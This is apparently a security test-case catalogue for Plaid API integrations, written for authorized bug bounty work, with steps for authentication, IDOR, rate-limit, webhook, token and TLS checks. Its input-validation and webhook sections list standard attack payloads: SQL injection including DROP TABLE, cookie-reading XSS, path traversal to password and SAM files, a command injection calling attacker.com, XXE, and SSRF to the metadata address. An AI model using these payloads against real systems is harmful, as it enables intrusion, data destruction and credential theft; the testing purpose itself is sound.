# Plaid API Security Test Cases

This document outlines comprehensive security test cases for Plaid API implementations. These tests are designed for authorized bug bounty hunting and security research.

## Table of Contents

1. [Authentication & Authorization](#authentication--authorization)
2. [IDOR Vulnerabilities](#idor-vulnerabilities)
3. [Rate Limiting & DoS](#rate-limiting--dos)
4. [Input Validation](#input-validation)
5. [Account Linking](#account-linking)
6. [Transaction Security](#transaction-security)
7. [Webhook Security](#webhook-security)
8. [Token Management](#token-management)
9. [API Endpoint Enumeration](#api-endpoint-enumeration)
10. [SSL/TLS Security](#ssltls-security)

---

## Authentication & Authorization

### TC-AUTH-001: Weak Credentials
**Severity:** CRITICAL
**Description:** Test if weak or default credentials are accepted
**Test Steps:**
1. Attempt authentication with empty client_id and secret
2. Try common default credentials (admin/admin, test/test)
3. Attempt single-character credentials
4. Test with special characters and SQL injection payloads

**Expected Result:** All weak credentials should be rejected with 401/400 status

### TC-AUTH-002: Credential Enumeration
**Severity:** MEDIUM
**Description:** Check if error messages reveal valid vs invalid credentials
**Test Steps:**
1. Send requests with valid client_id but invalid secret
2. Send requests with invalid client_id but valid secret
3. Compare error messages and response times

**Expected Result:** Error messages should be generic, not revealing which credential is invalid

### TC-AUTH-003: Brute Force Protection
**Severity:** HIGH
**Description:** Test for account lockout after failed authentication attempts
**Test Steps:**
1. Send 10+ authentication requests with invalid credentials
2. Check if account gets locked or rate limited
3. Monitor response times and status codes

**Expected Result:** Account should lock or rate limit after multiple failures

### TC-AUTH-004: Session Fixation
**Severity:** HIGH
**Description:** Test if session tokens can be fixed or predicted
**Test Steps:**
1. Obtain a valid access_token
2. Attempt to set or predict another user's token
3. Test token reuse across different sessions

**Expected Result:** Tokens should be unpredictable and session-specific

---

## IDOR Vulnerabilities

### TC-IDOR-001: Access Token Manipulation
**Severity:** CRITICAL
**Description:** Test unauthorized access via modified access tokens
**Test Steps:**
1. Obtain valid access_token for Account A
2. Increment/decrement token ID (if numeric)
3. Attempt to access Account B's data with modified token
4. Test with common IDOR patterns:
   - Sequential IDs: `access-sandbox-1`, `access-sandbox-2`
   - UUID manipulation
   - Token prediction

**Expected Result:** Modified tokens should be rejected with 401 Unauthorized

### TC-IDOR-002: Account ID Manipulation
**Severity:** CRITICAL
**Description:** Test if account_id parameters can access other accounts
**Test Steps:**
1. Call `/accounts/get` with valid credentials
2. Extract account_id from response
3. Modify account_id to access different accounts
4. Test patterns: sequential, UUID, GUID

**Expected Result:** Requests should only return data for authorized accounts

### TC-IDOR-003: Item ID Enumeration
**Severity:** HIGH
**Description:** Test if item_id values can be enumerated
**Test Steps:**
1. Obtain valid item_id
2. Iterate through item_id values (±1000 range)
3. Monitor for successful unauthorized access

**Expected Result:** Only authorized item_ids should return data

### TC-IDOR-004: Institution Access
**Severity:** MEDIUM
**Description:** Test access to internal or restricted institutions
**Test Steps:**
1. Call `/institutions/get` with standard credentials
2. Attempt to access institution_id values not in public list
3. Test internal institution IDs: `ins_internal_1`, `ins_test_bank`

**Expected Result:** Only public institutions should be accessible

---

## Rate Limiting & DoS

### TC-RATE-001: API Rate Limiting
**Severity:** MEDIUM
**Description:** Test if rate limiting is enforced on API endpoints
**Test Steps:**
1. Send 100+ requests to `/item/get` in rapid succession
2. Monitor for HTTP 429 (Too Many Requests)
3. Test rate limits on different endpoints

**Expected Result:** Rate limiting should activate (429 status) after threshold

### TC-RATE-002: Per-Endpoint Rate Limits
**Severity:** LOW
**Description:** Test if rate limits are per-endpoint or global
**Test Steps:**
1. Hit rate limit on `/accounts/get`
2. Attempt request to `/transactions/get`
3. Check if limit is shared across endpoints

**Expected Result:** Rate limits should be appropriately scoped

### TC-RATE-003: Bypass via Headers
**Severity:** MEDIUM
**Description:** Test rate limit bypass using X-Forwarded-For headers
**Test Steps:**
1. Hit rate limit with standard requests
2. Retry with modified headers:
   - `X-Forwarded-For: random_ip`
   - `X-Real-IP: random_ip`
   - `X-Originating-IP: random_ip`

**Expected Result:** Rate limits should not be bypassed via headers

### TC-RATE-004: Transaction Pagination DoS
**Severity:** MEDIUM
**Description:** Test if excessive pagination can cause DoS
**Test Steps:**
1. Request `/transactions/get` with extreme date ranges
2. Set count parameter to maximum value
3. Request all available pages in parallel

**Expected Result:** Reasonable limits on data retrieval

---

## Input Validation

### TC-INPUT-001: SQL Injection
**Severity:** CRITICAL
**Description:** Test for SQL injection vulnerabilities
**Test Steps:**
1. Inject SQL payloads into all string parameters:
   - `' OR '1'='1`
   - `'; DROP TABLE users--`
   - `1' UNION SELECT * FROM accounts--`
2. Test in: client_id, secret, access_token, account_id

**Expected Result:** SQL payloads should be sanitized, no SQL errors in response

### TC-INPUT-002: XSS (Cross-Site Scripting)
**Severity:** HIGH
**Description:** Test if script tags are reflected in responses
**Test Steps:**
1. Inject XSS payloads:
   - `<script>alert('XSS')</script>`
   - `<img src=x onerror=alert(1)>`
   - `javascript:alert(document.cookie)`
2. Check if payload is reflected in response

**Expected Result:** Scripts should be encoded/sanitized in responses

### TC-INPUT-003: Path Traversal
**Severity:** HIGH
**Description:** Test for directory traversal vulnerabilities
**Test Steps:**
1. Inject path traversal payloads:
   - `../../../etc/passwd`
   - `..\..\..\..\windows\system32\config\sam`
2. Test in file-related parameters

**Expected Result:** Path traversal attempts should be blocked

### TC-INPUT-004: Command Injection
**Severity:** CRITICAL
**Description:** Test for OS command injection
**Test Steps:**
1. Inject command payloads:
   - `; ls -la`
   - `| whoami`
   - `$(curl attacker.com)`
2. Monitor for command execution

**Expected Result:** Command injection should be prevented

### TC-INPUT-005: XXE (XML External Entity)
**Severity:** HIGH
**Description:** Test for XXE vulnerabilities if XML is accepted
**Test Steps:**
1. Send requests with Content-Type: application/xml
2. Include XXE payload:
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<request><data>&xxe;</data></request>
```

**Expected Result:** XXE payloads should be rejected or sanitized

### TC-INPUT-006: JSON Injection
**Severity:** MEDIUM
**Description:** Test for JSON structure manipulation
**Test Steps:**
1. Inject additional JSON fields:
   - `{"client_id": "valid", "admin": true}`
2. Test nested objects and arrays
3. Attempt JSON key overwriting

**Expected Result:** Additional/malicious fields should be ignored

---

## Account Linking

### TC-LINK-001: Public Token Reuse
**Severity:** HIGH
**Description:** Test if public tokens can be reused after exchange
**Test Steps:**
1. Exchange public_token for access_token
2. Attempt to reuse the same public_token
3. Test token exchange multiple times

**Expected Result:** Public tokens should be single-use only

### TC-LINK-002: Expired Token Acceptance
**Severity:** HIGH
**Description:** Test if expired public tokens are accepted
**Test Steps:**
1. Generate public_token
2. Wait for expiration period (typically 30 minutes)
3. Attempt to exchange expired token

**Expected Result:** Expired tokens should be rejected

### TC-LINK-003: Link Token Manipulation
**Severity:** MEDIUM
**Description:** Test link token for manipulation vulnerabilities
**Test Steps:**
1. Create link_token via `/link/token/create`
2. Modify token and attempt to use it
3. Test with tokens from different users

**Expected Result:** Modified or unauthorized tokens should fail

### TC-LINK-004: Cross-Account Linking
**Severity:** CRITICAL
**Description:** Test if one user can link another user's accounts
**Test Steps:**
1. Obtain public_token for User A
2. Attempt to exchange it using User B's credentials
3. Test for authorization bypass

**Expected Result:** Cross-account linking should be prevented

---

## Transaction Security

### TC-TRANS-001: Historical Data Access
**Severity:** HIGH
**Description:** Test excessive historical transaction retrieval
**Test Steps:**
1. Request transactions with start_date: 1900-01-01
2. Set end_date far in future: 2100-12-31
3. Monitor amount of data returned

**Expected Result:** Reasonable limits on historical data (typically 2 years)

### TC-TRANS-002: Transaction Manipulation
**Severity:** CRITICAL
**Description:** Test if transaction data can be modified
**Test Steps:**
1. Retrieve transactions via `/transactions/get`
2. Attempt to send modified transaction data back
3. Test update/delete operations on transactions

**Expected Result:** Transactions should be read-only via API

### TC-TRANS-003: Unauthorized Account Transactions
**Severity:** CRITICAL
**Description:** Test access to transactions of unauthorized accounts
**Test Steps:**
1. Get transactions for Account A
2. Modify account_id to Account B
3. Attempt to retrieve Account B's transactions

**Expected Result:** Only authorized account transactions should be accessible

### TC-TRANS-004: Pagination Manipulation
**Severity:** MEDIUM
**Description:** Test transaction pagination for data leakage
**Test Steps:**
1. Request transactions with count: 500 (max)
2. Test offset manipulation to access more data
3. Attempt negative offsets or extreme values

**Expected Result:** Pagination should enforce proper boundaries

---

## Webhook Security

### TC-WEBHOOK-001: SSRF via Webhook URL
**Severity:** CRITICAL
**Description:** Test for Server-Side Request Forgery
**Test Steps:**
1. Set webhook URL to internal addresses:
   - `http://localhost:8080`
   - `http://127.0.0.1:22`
   - `http://169.254.169.254/latest/meta-data/`
   - `http://internal.company.local/admin`
2. Monitor if Plaid attempts to connect

**Expected Result:** Internal URLs should be blocked

### TC-WEBHOOK-002: Webhook Verification Bypass
**Severity:** HIGH
**Description:** Test if webhook signatures can be bypassed
**Test Steps:**
1. Send webhook events without valid signature
2. Modify webhook payload and signature
3. Test replay attacks with old signatures

**Expected Result:** Invalid signatures should be rejected

### TC-WEBHOOK-003: Webhook Injection
**Severity:** MEDIUM
**Description:** Test for injection in webhook payloads
**Test Steps:**
1. Set webhook URL to attacker-controlled server
2. Capture webhook payloads
3. Test if user input is reflected without sanitization

**Expected Result:** Webhook data should be properly encoded

### TC-WEBHOOK-004: Open Redirect via Webhook
**Severity:** MEDIUM
**Description:** Test if webhook URLs can redirect to malicious sites
**Test Steps:**
1. Set webhook URL to redirect endpoint
2. Configure redirect to external/malicious domain
3. Monitor if Plaid follows redirects

**Expected Result:** Redirects should not be followed or should be restricted

---

## Token Management

### TC-TOKEN-001: Access Token Expiration
**Severity:** MEDIUM
**Description:** Test if access tokens properly expire
**Test Steps:**
1. Generate access_token
2. Wait for documented expiration period
3. Attempt to use expired token

**Expected Result:** Expired tokens should be rejected

### TC-TOKEN-002: Token Revocation
**Severity:** HIGH
**Description:** Test if revoked tokens are honored
**Test Steps:**
1. Create access_token
2. Revoke token via `/item/remove`
3. Attempt to use revoked token

**Expected Result:** Revoked tokens should be rejected immediately

### TC-TOKEN-003: Token Leakage in Logs
**Severity:** MEDIUM
**Description:** Test if tokens appear in error messages or logs
**Test Steps:**
1. Trigger various error conditions
2. Check error responses for token exposure
3. Review any debug information

**Expected Result:** Tokens should never appear in error messages

### TC-TOKEN-004: Refresh Token Security
**Severity:** HIGH
**Description:** Test refresh token implementation (if applicable)
**Test Steps:**
1. Obtain refresh token
2. Test if it can be used multiple times
3. Check for refresh token rotation

**Expected Result:** Refresh tokens should follow security best practices

---

## API Endpoint Enumeration

### TC-ENUM-001: Hidden Endpoint Discovery
**Severity:** LOW
**Description:** Test for undocumented API endpoints
**Test Steps:**
1. Fuzz common endpoint patterns:
   - `/admin/*`
   - `/internal/*`
   - `/debug/*`
   - `/v1/*`, `/v2/*`
2. Use wordlists for endpoint discovery

**Expected Result:** No sensitive undocumented endpoints exposed

### TC-ENUM-002: HTTP Method Testing
**Severity:** MEDIUM
**Description:** Test if unexpected HTTP methods are allowed
**Test Steps:**
1. Send PUT, DELETE, PATCH to GET-only endpoints
2. Test OPTIONS for CORS headers
3. Try HEAD requests

**Expected Result:** Only documented methods should be accepted

### TC-ENUM-003: API Version Bypass
**Severity:** MEDIUM
**Description:** Test access to deprecated or beta API versions
**Test Steps:**
1. Test `/v0/*`, `/v2/*`, `/beta/*` endpoints
2. Check for different behavior in older versions
3. Look for unpatched vulnerabilities in old versions

**Expected Result:** Deprecated versions should be disabled or secured

---

## SSL/TLS Security

### TC-SSL-001: HSTS Header
**Severity:** MEDIUM
**Description:** Test for HTTP Strict Transport Security
**Test Steps:**
1. Make HTTPS request to API
2. Check for `Strict-Transport-Security` header
3. Verify header includes `includeSubDomains`

**Expected Result:** HSTS header should be present with proper configuration

### TC-SSL-002: Certificate Validation
**Severity:** CRITICAL
**Description:** Test SSL certificate validity
**Test Steps:**
1. Verify certificate is valid and not expired
2. Check certificate chain
3. Validate certificate matches domain

**Expected Result:** Valid, properly configured SSL certificate

### TC-SSL-003: TLS Version
**Severity:** HIGH
**Description:** Test for outdated TLS versions
**Test Steps:**
1. Attempt connection with TLS 1.0
2. Attempt connection with TLS 1.1
3. Verify TLS 1.2+ is required

**Expected Result:** Only TLS 1.2 and TLS 1.3 should be accepted

### TC-SSL-004: Weak Cipher Suites
**Severity:** HIGH
**Description:** Test for weak encryption ciphers
**Test Steps:**
1. Use `nmap` or `testssl.sh` to enumerate ciphers
2. Check for NULL, EXPORT, or DES ciphers
3. Verify strong ciphers are preferred

**Expected Result:** Only strong cipher suites should be enabled

---

## Additional Test Cases

### TC-MISC-001: Information Disclosure
**Severity:** MEDIUM
**Description:** Test for sensitive information in responses
**Test Steps:**
1. Check HTTP headers for version disclosure
2. Review error messages for stack traces
3. Look for internal IP addresses or paths

**Expected Result:** No sensitive information disclosure

### TC-MISC-002: CORS Configuration
**Severity:** MEDIUM
**Description:** Test Cross-Origin Resource Sharing settings
**Test Steps:**
1. Send requests with various `Origin` headers
2. Check `Access-Control-Allow-Origin` response
3. Test for wildcard origin acceptance

**Expected Result:** Restrictive CORS policy

### TC-MISC-003: Content Security Policy
**Severity:** LOW
**Description:** Test for CSP headers (if web interface exists)
**Test Steps:**
1. Check for `Content-Security-Policy` header
2. Verify policy restricts inline scripts
3. Test policy effectiveness

**Expected Result:** Strong CSP policy in place

---

## Testing Methodology

### Setup
1. Copy `config.json.example` to `config.json`
2. Fill in your Plaid sandbox credentials
3. Ensure you have proper authorization for testing
4. Review and follow responsible disclosure guidelines

### Execution
```bash
# Run all tests
python3 plaid_tester.py -c config.json

# Run specific test category
python3 plaid_tester.py -c config.json -t auth
python3 plaid_tester.py -c config.json -t idor
python3 plaid_tester.py -c config.json -t rate

# Generate custom report
python3 plaid_tester.py -c config.json -o custom_report.json
```

### Reporting
1. Review test results in generated JSON report
2. Document all vulnerabilities found
3. Follow responsible disclosure process
4. Use templates in `/templates` for bug reports

---

## Legal and Ethical Considerations

**IMPORTANT:**
- Only test systems you have explicit authorization to test
- Plaid Sandbox is intended for development, not security testing
- For production testing, obtain written authorization
- Follow Plaid's bug bounty program guidelines if they exist
- Respect rate limits and avoid DoS conditions
- Never test with real user data
- Report vulnerabilities responsibly

---

## References

- [OWASP API Security Top 10](https://owasp.org/www-project-api-security/)
- [Plaid API Documentation](https://plaid.com/docs/)
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- Bug Bounty Methodologies in `/methodology/`

---

**Last Updated:** 2026-01-03
**Version:** 1.0.0
